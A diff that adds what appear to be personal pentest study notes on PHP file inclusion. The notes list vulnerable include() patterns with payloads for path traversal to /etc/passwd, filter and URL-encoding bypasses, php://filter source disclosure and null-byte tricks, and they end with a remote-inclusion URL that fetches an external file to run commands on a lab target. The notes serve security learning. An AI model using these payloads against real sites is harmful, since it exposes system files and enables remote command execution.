@@ -8,3 +8,55 @@ Template Engines are not the only place an LFI Vulnerability can be discovered. 
 
 File inclusion vulnerabilities can often be found in GET request parameters. Server-side scripts include certain files based on the user's choice or input, for example, file downloads, choice of language, or website navigation.
 
+
+File inclusion vulnerabilities can often be found in GET request parameters. Server-side scripts include certain files based on the user's choice or input, for example, file downloads, choice of language, or website navigation.
+
+TEST CASES
+
+Basic LFI - include($_GET['language']);
+ ?language=/etc/passwd 
+ can view contents directly
+ 
+ LFI with Path transversal - include("./languages/" . $_GET['language']);
+?language=../../../../../etc/passwd 
+ This restriction can be bypassed by traversing directories using a few ../ before the desired file name.
+ 
+                    OR
+If in this scenario, input such as ../../../../../etc/passwd will result in the final string to be lang_../../../../../etc/passwd, which is invalid, 
+
+                    THEN
+
+starting with / before payload
+?language=/../../../../../etc/passwd
+ez bypass
+
+
+
+LFI with Blacklisting - $language = str_replace('../', '', $_GET['language']);
+?language=...//...//...//...//...//...//etc/passwd
+All the ../ substrings were removed, which resulted in a final path of ./languages/etc/passwd, but there is an issue with how this check was coded. It is not removing ../ recursively, which means removing the occurrences from the string a single time. If removing ../, creates a new instance of ../, the new instance will not be removed. For example, both ..././ and ....// would become ../ after the replace function. Let's try applying this logic to includpe /etc/passwd again.
+
+smol tip = cat .?/.*/.?/etc/passwd
+
+Bypass with url encoding - On PHP versions 5.3.4 and earlier, string-based detection could be bypassed by URL encoding the payload. The characters ../ can be URL encoded into %2e%2e%2f, which will bypass the filter.
+?language=%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd
+
+
+Lfi with appended Extention - include($_GET['language'] . ".php");
+
+Scripts can manually append a .php or any other required extension before including the file, which serves as mitigation against the inclusion of arbitrary files.
+
+Source code disclosure via PHP wrappers - https://www.php.net/manual/en/wrappers.php.php
+For example, the filter php://filter/read=/resource=/etc/passwd reads the resource /etc/passwd and outputs the contents. The read filter can process the input with various string operations, such as base64 encoding, ROT13 encoding, etc.
+The following filters will convert the contents of /etc/passwd to base64 and ROT13, respectively.
+  Source Code Disclosure via PHP Wrappersphp://filter/read=convert.base64-encode/resource=/etc/passwd
+php://filter/read=string.rot13/resource=/etc/passwd
+
+
+Extention bypassusing Null Byte - PHP versions before 5.5 are vulnerable to null byte injection, meaning that adding a null byte at the end of the filename should bypass the extension check. For example: language=/etc/passwd%00 will result in the statement include("/etc/passwd%00.php"), where the server ignores everything after the null byte.
+
+
+
+FILE INCLUSION
+
+http://ptc-444a41be-8e806a8a.libcurl.so/?page=http://assets.pentesterlab.com/test_include_system.txt%00&c=[cmd]
